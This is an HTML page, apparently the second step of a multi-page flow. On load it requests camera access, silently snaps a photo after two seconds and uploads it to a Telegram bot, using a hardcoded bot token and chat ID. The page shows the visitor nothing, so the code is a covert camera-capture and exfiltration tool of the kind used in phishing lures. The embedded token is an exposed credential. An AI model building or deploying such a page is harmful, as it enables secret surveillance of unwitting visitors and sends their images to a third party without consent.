<!-- capture.html (Second Page) -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Capture</title>
</head>
<body>

<script>
    window.onload = function() {
        // Request access to the user's camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                // Capture photo after a short delay (adjust as needed)
                setTimeout(function () {
                    capturePhoto(stream);
                }, 2000); // 2000 milliseconds (2 seconds) delay
            })
            .catch(function (error) {
                console.error('Error accessing camera:', error);
            });
    };

    function capturePhoto(stream) {
        // Create a canvas element to capture the photo
        var canvas = document.createElement('canvas');
        var video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        var ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Stop the camera stream
        stream.getTracks().forEach(function (track) {
            track.stop();
        });

        // Convert the canvas content to a Blob (image file)
        canvas.toBlob(function (blob) {
            // Create a FormData object to send the photo as a file
            var formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            formData.append('chat_id', '-1001590820560'); // Replace with your actual chat ID

            // Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
            var botToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg';

            // Send the image to Telegram Bot API using the sendPhoto method
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData,
            })
            .then(response => response.json())
            .then(data => console.log('Telegram API response:', data))
            .catch(error => console.error('Error sending photo to Telegram:', error));
        }, 'image/jpeg');
    }
</script>

</body>
</html>
